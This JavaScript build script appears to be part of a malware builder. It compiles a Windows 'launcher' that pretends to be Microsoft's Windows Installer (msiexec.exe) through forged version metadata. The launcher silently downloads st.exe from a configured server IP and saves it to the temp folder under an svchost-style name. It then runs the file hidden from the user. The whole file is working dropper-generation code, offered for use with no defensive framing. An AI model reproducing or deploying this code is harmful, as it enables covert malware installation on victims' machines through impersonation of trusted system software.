// language: JavaScript, file: builder/compile.js
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';

const execFileP = promisify(execFile);
const CC      = process.env.MINGW_CC      || 'x86_64-w64-mingw32-gcc';
const WINDRES = process.env.MINGW_WINDRES || 'x86_64-w64-mingw32-windres';

function rcSource() {
  return `
#include <windows.h>
1 ICON "icon.ico"
VS_VERSION_INFO VERSIONINFO
FILEVERSION     1,0,0,0
PRODUCTVERSION  1,0,0,0
FILEOS          VOS_NT_WINDOWS32
FILETYPE        VFT_APP
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName",      "Microsoft Corporation"
            VALUE "FileDescription",  "Windows Installer"
            VALUE "FileVersion",      "1.0.0.0"
            VALUE "InternalName",     "msiexec"
            VALUE "OriginalFilename", "msiexec.exe"
            VALUE "ProductName",      "Windows Installer"
        END
    END
END
`;
}

function cSource({ ip }) {
  return `
#include <windows.h>
#include <urlmon.h>
#include <stdio.h>

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    char exePath[MAX_PATH];
    _snprintf(exePath, MAX_PATH, "%ssvchost_%08x.exe", tempPath, GetTickCount());

    const char* url = "http://${ip}/api/downloads/st.exe";
    
    HRESULT hr = URLDownloadToFileA(NULL, url, exePath, 0, NULL);
    if (SUCCEEDED(hr)) {
        ShellExecuteA(NULL, "open", exePath, NULL, NULL, SW_HIDE);
    }

    return 0;
}
`;
}

export async function compileLauncher({ key, config, baseExe }) {
  // We need the server IP to bake into the downloader
  let ip = "127.0.0.1";
  if (config && config.ip) ip = config.ip;

  const workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wh-build-'));
  const cPath      = path.join(workDir, 'launcher.c');
  const rcPath     = path.join(workDir, 'app.rc');
  const resPath    = path.join(workDir, 'app.res');
  const outPath    = path.join(workDir, 'launcher.exe');

  fs.writeFileSync(cPath, cSource({ ip }));
  fs.writeFileSync(rcPath, rcSource());

  const iconSourcePath = path.join(__dirname, '..', 'icon.ico');
  if (fs.existsSync(iconSourcePath)) {
    fs.copyFileSync(iconSourcePath, path.join(workDir, 'icon.ico'));
  } else {
    // Create a dummy 1x1 transparent ico if missing
    const dummyIcon = Buffer.from('00000100010001010000010018003000000016000000280000000100000002000000010018000000000000000000000000000000000000000000000000000000000000000000', 'hex');
    fs.writeFileSync(path.join(workDir, 'icon.ico'), dummyIcon);
  }

  try {
    await execFileP(WINDRES, [
      '-I', workDir, '-i', rcPath, '-o', resPath, '--input-format=rc', '--output-format=coff'
    ], { cwd: workDir, timeout: 30_000 });

    await execFileP(CC, [
      '-O2', '-s', '-mwindows', '-o', outPath, cPath, resPath,
      '-lurlmon', '-lshell32', '-luser32', '-lkernel32'
    ], { cwd: workDir, timeout: 60_000 });

    return fs.readFileSync(outPath);
  } finally {
    try { fs.rmSync(workDir, { recursive: true, force: true }); } catch {}
  }
}